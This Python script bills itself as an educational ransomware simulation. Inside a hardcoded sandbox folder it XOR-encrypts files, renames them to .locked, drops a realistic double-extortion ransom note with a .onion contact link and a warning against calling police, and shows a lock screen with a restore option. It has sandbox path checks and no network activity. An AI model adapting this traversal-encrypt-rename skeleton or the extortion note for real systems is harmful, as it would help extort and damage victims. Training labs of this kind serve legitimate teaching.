"""
SAFE ransomware simulation for education only.

This script is intentionally constrained to one hardcoded sandbox directory:
C:\\RansomLab\\sandbox

It demonstrates file traversal, reversible XOR encryption/decryption,
locked file renaming, and ransom note creation.
"""

from __future__ import annotations

import argparse
import os
from pathlib import Path
from datetime import datetime, timezone
import time
from uuid import uuid4
import tkinter as tk
from tkinter import messagebox

# Hardcoded sandbox path. The script must never process anything outside this directory.
SANDBOX_DIR = Path(r"C:\RansomLab\sandbox")
LOCKED_EXTENSION = ".locked"
RANSOM_NOTE_NAME = "README.txt"
ACTIVITY_LOG_NAME = "activity.log"
XOR_KEY = b"EDU_SAFE_KEY_2026"


def log(message: str) -> None:
    """Print a standardized log message."""
    stamped_message = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [SIM] {message}"
    print(stamped_message)

    # Write logs only inside the sandbox so no external filesystem activity occurs.
    log_path = SANDBOX_DIR / ACTIVITY_LOG_NAME
    try:
        if SANDBOX_DIR.exists() and SANDBOX_DIR.is_dir() and is_within_sandbox(log_path):
            with log_path.open("a", encoding="utf-8") as handle:
                handle.write(stamped_message + "\n")
    except Exception:
        # Logging to file is best-effort; console output remains primary.
        pass


def xor_bytes(data: bytes, key: bytes) -> bytes:
    """Apply repeating-key XOR. XOR is reversible by running the same operation again."""
    return bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))


def is_within_sandbox(path: Path) -> bool:
    """Return True only if the resolved path stays inside the resolved sandbox root."""
    try:
        sandbox_resolved = SANDBOX_DIR.resolve(strict=False)
        path_resolved = path.resolve(strict=False)
        common = Path(os.path.commonpath([str(sandbox_resolved), str(path_resolved)]))
        return common == sandbox_resolved
    except ValueError:
        # Different drives or invalid paths are treated as unsafe.
        return False


def encrypt_file(file_path: Path) -> None:
    """Encrypt one file in-place using XOR."""
    if not is_within_sandbox(file_path):
        log(f"Skipping unsafe path outside sandbox: {file_path}")
        return

    try:
        raw = file_path.read_bytes()
        encrypted = xor_bytes(raw, XOR_KEY)
        file_path.write_bytes(encrypted)
        log(f"Encrypted: {file_path}")
    except Exception as exc:
        log(f"Failed to encrypt {file_path}: {exc}")


def decrypt_file(file_path: Path) -> None:
    """Decrypt one file in-place using XOR (same operation as encryption)."""
    if not is_within_sandbox(file_path):
        log(f"Skipping unsafe path outside sandbox: {file_path}")
        return

    try:
        raw = file_path.read_bytes()
        decrypted = xor_bytes(raw, XOR_KEY)
        file_path.write_bytes(decrypted)
        log(f"Decrypted: {file_path}")
    except Exception as exc:
        log(f"Failed to decrypt {file_path}: {exc}")


def create_ransom_note() -> None:
    """Create (or overwrite) a fake ransom note in the sandbox root."""
    note_path = SANDBOX_DIR / RANSOM_NOTE_NAME

    if not is_within_sandbox(note_path):
        log(f"Refusing to write note outside sandbox: {note_path}")
        return

    incident_id = uuid4().hex[:12].upper()
    generated_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    note_text = (
    "::: 5H4D0W_1NC LOCKER ::: \n"
    "\n"
    "!!! ALL YOUR FILES ARE ENCRYPTED !!!\n"
    "\n"
    "Hello,\n"
    "\n"
    "If you are reading this message, it means your company's network has been breached \n"
    "and all your data has been encrypted by \"5H4D0W_1NC\" group. \n"
    "\n"
    "WHAT HAPPENED?\n"
    "We have exploited vulnerabilities in your network infrastructure. All your servers, \n"
    "databases, and backups have been locked with military-grade encryption algorithms \n"
    "(AES-256 & RSA-2048). You cannot recover your files without our private key.\n"
    "\n"
    "DATA LEAK WARNING:\n"
    "Before encryption, we downloaded your confidential data . If you refuse to pay or do not contact us, this \n"
    "data will be published on our Tor blog for your competitors and regulators to see. \n"
    "\n"
    "HOW TO GET YOUR FILES BACK?\n"
    "We are not interested in destroying your business, we only want payment.\n"
    "You must purchase a unique decryption tool from us.\n"
    "\n"
    ">>> LEGAL & REPUTATION NOTICE (IMPORTANT):\n"
    "We have analyzed your files If you do not pay:\n"
    "1. We will send copies of this incriminating data directly to your GOVERNMENT \n"
    "   agencies and regulators to trigger an investigation against you.\n"
    "2. We will email your clients, business partners, and everyone in your CONTACT \n"
    "   LIST to inform them that you lost their data.\n"
    "\n"
    "INSTRUCTIONS:\n"
    "1. Download and install Tor Browser: https://www.torproject.org/\n"
    "2. Open Tor Browser and navigate to our chat portal:\n"
    "   http://oaptxiyisljt2kv3we2we34kuudmqda7f2geffoylzpeo7ourhtz4dad.onion/login.php\n"
    "3. Enter your Personal ID to start the negotiation\n"
    "(If the website is down or inaccessible, please try again after some time.)\n"
    "\n"
    "Your Personal ID:\n"
    "[snip]-0APT-KEY\n"
    "\n"
    "DEADLINE:\n"
    "You have 24 hours to contact us. After this, the price will double.\n"
    "If we do not hear from you within 48 hours, your data will be leaked permanently.\n"
    "\n"
    "ATTENTION:\n"
    "- Do not rename encrypted files.\n"
    "- Do not try to decrypt using third-party software (you may lose data forever).\n"
    "- Do not call the police or FBI (we will leak data immediately).\n"
    "\n"
    "-- 5H4D0W_1NC Team --\n"
)

    try:
        note_path.write_text(note_text, encoding="utf-8")
        log(f"Created ransom note: {note_path}")
    except Exception as exc:
        log(f"Failed to create ransom note {note_path}: {exc}")


def open_activity_log() -> None:
    """Open the sandbox activity log file using the default system viewer."""
    log_path = SANDBOX_DIR / ACTIVITY_LOG_NAME
    if not is_within_sandbox(log_path):
        log(f"Refusing to open log outside sandbox: {log_path}")
        return

    if not log_path.exists():
        log(f"Activity log file not found: {log_path}")
        return

    try:
        os.startfile(str(log_path))
        log(f"Opened activity log: {log_path}")
    except Exception as exc:
        log(f"Failed to open activity log {log_path}: {exc}")


def launch_lock_interface(affected_files: int, elapsed_seconds: float) -> None:
    """
    Show a safe simulation UI after encryption completes.

    This interface does not alter system settings and only calls sandbox-scoped
    simulation functions already protected by safety checks.
    """
    root = tk.Tk()
    root.title("Security Access Console")
    root.geometry("880x520")
    root.minsize(780, 470)
    root.configure(bg="#050605")

    container = tk.Frame(
        root,
        bg="#0b0d0b",
        padx=18,
        pady=18,
        highlightbackground="#1d3a1d",
        highlightthickness=1,
    )
    container.pack(fill="both", expand=True, padx=18, pady=18)

    header = tk.Label(
        container,
        text="[ SYSTEM ACCESS TERMINAL ]",
        font=("Consolas", 15, "bold"),
        fg="#ff6a3a",
        bg="#0b0d0b",
        anchor="w",
    )
    header.pack(fill="x", pady=(0, 10))

    terminal_panel = tk.Frame(
        container,
        bg="#080a08",
        highlightbackground="#1b511b",
        highlightthickness=1,
        padx=14,
        pady=12,
    )
    terminal_panel.pack(fill="both", expand=True)

    status_var = tk.StringVar(value="> STATUS: Recovery required")

    # Build a terminal-like status readout for a stronger cyber-lab presentation style.
    terminal_lines = (
        "> boot sequence.................ok\n"
        "> endpoint profile..............restricted\n"
        "> channel state..................isolated\n"
        ">\n"
        f"> affected files.................{affected_files}\n"
        f"> processing time................{elapsed_seconds:.2f} s\n"
        "> current status.................Files inaccessible\n"
        f"> sandbox scope..................{SANDBOX_DIR}\n"
        ">\n"
        "> operator action required."
    )

    terminal_label = tk.Label(
        terminal_panel,
        text=terminal_lines,
        justify="left",
        anchor="nw",
        font=("Consolas", 12),
        fg="#7dff7d",
        bg="#080a08",
    )
    terminal_label.pack(fill="both", expand=True)

    status_label = tk.Label(
        terminal_panel,
        textvariable=status_var,
        font=("Consolas", 11, "bold"),
        fg="#ffb347",
        bg="#080a08",
        anchor="w",
        pady=8,
    )
    status_label.pack(fill="x")

    buttons = tk.Frame(container, bg="#0b0d0b")
    buttons.pack(anchor="w", pady=(14, 0))

    def on_restore_access() -> None:
        start = time.perf_counter()
        decrypt_stats = process_directory("decrypt")
        decrypt_elapsed = time.perf_counter() - start
        log_summary("decrypt", decrypt_stats)
        status_var.set(
            f"> STATUS: Access restored | decrypted={decrypt_stats['decrypted']} | time={decrypt_elapsed:.2f}s"
        )
        messagebox.showinfo("Recovery Complete", "Sandbox files have been restored.")

    restore_button = tk.Button(
        buttons,
        text="[ Restore Access ]",
        command=on_restore_access,
        bg="#0f1610",
        fg="#89ff89",
        activebackground="#1a2a1a",
        activeforeground="#b6ffb6",
        relief="flat",
        highlightbackground="#295229",
        highlightthickness=1,
        bd=0,
        padx=14,
        pady=9,
        font=("Consolas", 11, "bold"),
        cursor="hand2",
    )
    restore_button.grid(row=0, column=0, padx=(0, 12))

    log_button = tk.Button(
        buttons,
        text="[ View Activity Log ]",
        command=open_activity_log,
        bg="#111313",
        fg="#d0d6d0",
        activebackground="#1f2322",
        activeforeground="#ecf2ec",
        relief="flat",
        highlightbackground="#3a3f3d",
        highlightthickness=1,
        bd=0,
        padx=14,
        pady=9,
        font=("Consolas", 11),
        cursor="hand2",
    )
    log_button.grid(row=0, column=1, padx=(0, 12))

    exit_button = tk.Button(
        buttons,
        text="[ Exit ]",
        command=root.destroy,
        bg="#2a1110",
        fg="#ff9f8a",
        activebackground="#3a1816",
        activeforeground="#ffffff",
        relief="flat",
        highlightbackground="#5a2822",
        highlightthickness=1,
        bd=0,
        padx=14,
        pady=9,
        font=("Consolas", 11),
        cursor="hand2",
    )
    exit_button.grid(row=0, column=2)

    root.mainloop()


def process_directory(mode: str) -> dict[str, int]:
    """
    Traverse sandbox files and process based on mode.

    encrypt mode:
    - Skip already encrypted *.locked files
    - Encrypt regular files, then rename to append .locked

    decrypt mode:
    - Process only *.locked files
    - Decrypt them, then rename back by removing .locked
    """
    # Counters make it obvious why the run appears to do "nothing".
    stats = {
        "found_files": 0,
        "encrypted": 0,
        "decrypted": 0,
        "renamed_locked": 0,
        "renamed_restored": 0,
        "skipped_already_locked": 0,
        "skipped_non_locked": 0,
        "skipped_protected": 0,
        "errors": 0,
    }

    if not SANDBOX_DIR.exists():
        log(f"Sandbox directory does not exist: {SANDBOX_DIR}")
        log("Troubleshoot: create the sandbox folder and place test files in it.")
        return stats

    if not SANDBOX_DIR.is_dir():
        log(f"Sandbox path is not a directory: {SANDBOX_DIR}")
        return stats

    if not is_within_sandbox(SANDBOX_DIR):
        log(f"Unsafe sandbox path detected; aborting: {SANDBOX_DIR}")
        return stats

    log(f"Mode: {mode}")
    log(f"Sandbox root: {SANDBOX_DIR.resolve(strict=False)}")

    for root, _, files in os.walk(SANDBOX_DIR, topdown=True, followlinks=False):
        root_path = Path(root)

        if not is_within_sandbox(root_path):
            log(f"Skipping unsafe directory outside sandbox: {root_path}")
            continue

        for filename in files:
            file_path = root_path / filename
            stats["found_files"] += 1

            if not is_within_sandbox(file_path):
                log(f"Skipping unsafe file outside sandbox: {file_path}")
                continue

            # Keep internal simulation files readable for troubleshooting and control.
            if filename in {RANSOM_NOTE_NAME, ACTIVITY_LOG_NAME}:
                log(f"Skipping protected simulation file: {file_path}")
                stats["skipped_protected"] += 1
                continue

            if mode == "encrypt":
                if file_path.name.endswith(LOCKED_EXTENSION):
                    log(f"Skipping already encrypted file: {file_path}")
                    stats["skipped_already_locked"] += 1
                    continue

                encrypt_file(file_path)
                locked_path = file_path.with_name(file_path.name + LOCKED_EXTENSION)

                if not is_within_sandbox(locked_path):
                    log(f"Skipping unsafe rename target: {locked_path}")
                    continue

                try:
                    file_path.rename(locked_path)
                    log(f"Renamed to locked: {locked_path}")
                    stats["encrypted"] += 1
                    stats["renamed_locked"] += 1
                except Exception as exc:
                    log(f"Failed to rename {file_path} -> {locked_path}: {exc}")
                    stats["errors"] += 1

            elif mode == "decrypt":
                if not file_path.name.endswith(LOCKED_EXTENSION):
                    log(f"Skipping non-locked file: {file_path}")
                    stats["skipped_non_locked"] += 1
                    continue

                decrypt_file(file_path)
                restored_name = file_path.name[: -len(LOCKED_EXTENSION)]
                restored_path = file_path.with_name(restored_name)

                if not restored_name:
                    log(f"Skipping invalid restored name for file: {file_path}")
                    continue

                if not is_within_sandbox(restored_path):
                    log(f"Skipping unsafe rename target: {restored_path}")
                    continue

                try:
                    file_path.rename(restored_path)
                    log(f"Restored filename: {restored_path}")
                    stats["decrypted"] += 1
                    stats["renamed_restored"] += 1
                except Exception as exc:
                    log(f"Failed to rename {file_path} -> {restored_path}: {exc}")
                    stats["errors"] += 1

    # End-of-run diagnostics help explain common no-op cases.
    if stats["found_files"] == 0:
        log("Troubleshoot: no files were found in the sandbox.")

    if mode == "encrypt" and stats["encrypted"] == 0 and stats["found_files"] > 0:
        log("Troubleshoot: nothing encrypted. Files may already end with .locked, or only protected files are present.")

    if mode == "decrypt" and stats["decrypted"] == 0 and stats["found_files"] > 0:
        log("Troubleshoot: nothing decrypted. No files ending with .locked were found.")

    return stats


def log_summary(mode: str, stats: dict[str, int]) -> None:
    """Print a compact summary so test outcomes are easy to verify."""
    log("----- Summary -----")
    log(f"Found files: {stats['found_files']}")
    if mode == "encrypt":
        log(f"Encrypted files: {stats['encrypted']}")
        log(f"Renamed to .locked: {stats['renamed_locked']}")
        log(f"Skipped already .locked: {stats['skipped_already_locked']}")
    elif mode == "decrypt":
        log(f"Decrypted files: {stats['decrypted']}")
        log(f"Renamed back to original: {stats['renamed_restored']}")
        log(f"Skipped non-.locked files: {stats['skipped_non_locked']}")
    log(f"Skipped protected files: {stats['skipped_protected']}")
    log(f"Errors: {stats['errors']}")


def main() -> None:
    """Entry point with mode switch: encrypt or decrypt."""
    parser = argparse.ArgumentParser(
        description="SAFE ransomware simulation constrained to C:\\RansomLab\\sandbox"
    )
    parser.add_argument(
        "mode",
        choices=["encrypt", "decrypt"],
        help="Select simulation mode.",
    )
    args = parser.parse_args()

    if args.mode == "encrypt":
        log("Starting encryption simulation...")
        started_at = time.perf_counter()
        stats = process_directory("encrypt")
        create_ransom_note()
        elapsed = time.perf_counter() - started_at
        log_summary("encrypt", stats)
        log("Encryption simulation complete.")
        launch_lock_interface(affected_files=stats["encrypted"], elapsed_seconds=elapsed)
    elif args.mode == "decrypt":
        log("Starting decryption simulation...")
        stats = process_directory("decrypt")
        log_summary("decrypt", stats)
        log("Decryption simulation complete.")


if __name__ == "__main__":
    main()
